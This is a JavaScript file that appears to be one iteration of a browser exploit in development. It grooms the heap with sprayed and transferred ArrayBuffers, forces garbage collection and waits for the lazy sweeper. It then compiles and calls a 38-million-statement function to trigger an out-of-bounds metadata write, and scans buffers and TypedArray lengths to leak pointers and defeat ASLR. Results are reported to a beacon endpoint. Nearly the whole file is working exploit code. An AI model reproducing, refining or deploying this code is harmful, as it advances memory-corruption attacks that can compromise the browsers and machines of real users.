// p162 — MetadataTable ASLR leak with sweeper delay
//
// V160 got COMPILED-OK + MISS-200-ANYMOD-NO.
// Hypothesis: lazy sweeper didn't free clone backing stores before MetadataTable allocated.
// Fix: Add 3s delay between GC and compilation for sweeper finalization.
// Also: FinalizationRegistry diagnostic to confirm clone collection.
// Also: TypedArray m_length scan (which V160 didn't do).
//
// Beacon prefix: V162-
(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V162-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      if (body) x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  var BUF_SZ = 100112;
  var SPRAY_N = 400;
  var TARGET_N = 8000;

  // Phase 1: Spray ArrayBuffers
  var bufs = new Array(SPRAY_N);
  for (var i = 0; i < SPRAY_N; i++) bufs[i] = new ArrayBuffer(BUF_SZ);
  B('SPRAY-' + SPRAY_N);

  // Phase 2: TypedArray targets at higher addresses
  var targets = new Array(TARGET_N);
  for (var i = 0; i < TARGET_N; i++) targets[i] = new Uint8Array(16);
  B('TARGETS-' + TARGET_N);

  // Phase 3: Transfer even-indexed via structuredClone
  // Track collection with FinalizationRegistry
  var frCount = 0;
  var fr = null;
  try {
    fr = new FinalizationRegistry(function() { frCount++; });
  } catch(e) { B('NO-FR'); }

  var transferred = 0;
  for (var i = 0; i < SPRAY_N; i += 2) {
    try {
      var clone = structuredClone(bufs[i], {transfer: [bufs[i]]});
      if (fr) fr.register(clone, i);
      clone = null;
      transferred++;
    } catch(e) {
      if (transferred === 0) { B('XFER-ERR-' + e.message.substring(0, 40)); return; }
    }
    bufs[i] = null;
  }
  B('XFER-' + transferred);

  // Phase 4: Views on surviving odd-indexed buffers + fill with 0xAA marker
  var views = [];
  for (var i = 1; i < SPRAY_N; i += 2) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      var v = new Uint8Array(bufs[i]);
      for (var j = 0; j < v.length; j += 4) {
        v[j] = 0xAA; v[j+1] = 0xAA; v[j+2] = 0xAA; v[j+3] = 0xAA;
      }
      views.push(v);
    }
  }
  bufs = null;
  B('VIEWS-' + views.length);

  // Phase 5: Unwind stack + aggressive GC
  setTimeout(function() {
    for (var g = 0; g < 20; g++) {
      var junk = [];
      for (var j = 0; j < 80000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC1-FR' + frCount);

    // Phase 6: SWEEPER DELAY — 3 seconds for lazy sweeper to finalize dead cells
    setTimeout(function() {
      // Second GC round to ensure sweeper processes all dead cells
      for (var g = 0; g < 10; g++) {
        var junk = [];
        for (var j = 0; j < 50000; j++) junk.push({x: j});
        junk = null;
      }
      B('GC2-FR' + frCount);

      // Phase 7: Build 38M function
      var N = 38348816;
      var CHUNK = 4000000;
      var nC = Math.floor(N / CHUNK);
      var rem = N - nC * CHUNK;
      var rep = 'a();'.repeat(CHUNK);
      var parts = new Array(nC + 3);
      parts[0] = 'window.__p162fn=function(a){';
      for (var c = 0; c < nC; c++) parts[1 + c] = rep;
      parts[nC + 1] = 'a();'.repeat(rem);
      parts[nC + 2] = '};window.__p162ok=1;';
      rep = null;

      var blob = new Blob(parts, {type: 'application/javascript'});
      B('BLOB-' + Math.round(blob.size / 1048576) + 'MB-FR' + frCount);
      parts = null;

      var sc = document.createElement('script');
      sc.onerror = function() { B('SCRIPT-ERR'); };
      sc.onload = function() {
        B('COMPILED-' + (window.__p162ok ? 'OK' : 'FAIL'));

        // CRITICAL: CALL the function to trigger CodeBlock linking + finishCreation OOB writes
        // finishCreation runs on FIRST CALL, NOT during script load (V160 missed this!)
        // First a() uses in-bounds metadata (entry 0), callback throws, execution stops
        // All 38M entries already written OOB by finishCreation before first a() executes
        B('CALLING');
        var callOk = false;
        try {
          window.__p162fn(function() { throw 'V162STOP'; });
        } catch(e) {
          callOk = true;
          B('SURVIVED');
        }
        if (!callOk) B('CALL-NO-THROW');

        doScan();
      };
      document.head.appendChild(sc);
      sc.src = URL.createObjectURL(blob);
    }, 3000);
  }, 500);

  function doScan() {
    // === SCAN A: Surviving spray buffers (filled with 0xAA) ===
    var hitBufs = 0;
    var sprayLeaks = [];

    for (var vi = 0; vi < views.length; vi++) {
      var v = views[vi];
      // Check for any non-0xAA byte at sweep-relevant offsets
      var modded = false;
      for (var off = 0; off < v.length - 32; off += 112) {
        if (u32(v, off + 12) !== 0xAAAAAAAA) { modded = true; break; }
        for (var b = off + 24; b < off + 32; b++) { if (v[b] !== 0xAA) { modded = true; break; } }
        if (modded) break;
      }
      if (!modded) {
        // Full check: any byte not 0xAA
        for (var off = 0; off < v.length; off += 32) {
          if (v[off] !== 0xAA || v[off+8] !== 0xAA || v[off+16] !== 0xAA || v[off+24] !== 0xAA) {
            modded = true; break;
          }
        }
      }
      if (!modded) continue;
      hitBufs++;

      // Find entry alignment
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= v.length; off += 112) {
          if (u32(v, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }

      if (bestBase >= 0 && bestHits >= 3) {
        for (var eOff = bestBase; eOff + 32 <= v.length && sprayLeaks.length < 5; eOff += 112) {
          if (u32(v, eOff + 12) !== 0xFFFFFFFF) continue;
          var hasPtr = false;
          for (var b = eOff + 24; b < eOff + 32; b++) { if (v[b] !== 0 && v[b] !== 0xAA) { hasPtr = true; break; } }
          if (!hasPtr) continue;
          sprayLeaks.push(hex8(v, eOff + 24));
        }
      }
      if (sprayLeaks.length >= 5) break;
    }

    B('SPRAY-bufs' + hitBufs + '-ptrs' + sprayLeaks.length + '-FR' + frCount);
    for (var i = 0; i < sprayLeaks.length; i++) B('SP' + i + '-' + sprayLeaks[i]);

    // === SCAN B: TypedArray m_length corruption ===
    var leakN = 0, caseBN = 0, errN = 0;
    var leaked = [];

    for (var i = 0; i < TARGET_N; i++) {
      try {
        var len = targets[i].length;
        if (len !== 16) {
          if (len > 281474976710656) caseBN++;
          else if (len > 4096) { if (leakN < 30) leaked.push(len); leakN++; }
          targets[i] = null;
        }
      } catch(e) { errN++; targets[i] = null; }
    }

    B('TYPED-L' + leakN + '-B' + caseBN + '-E' + errN);
    if (leakN > 0) {
      var p = BigInt(leaked[0]);
      B('TYPED-ASLR-' + p.toString(16));
    }

    if (sprayLeaks.length > 0 || leakN > 0) B('ASLR-LEAK-CONFIRMED');
    else if (hitBufs > 0 || caseBN > 0 || errN > 0) B('SWEEP-HIT-MISALIGN');
    else B('NO-HIT-FR' + frCount);

    B('DONE');
  }
})();
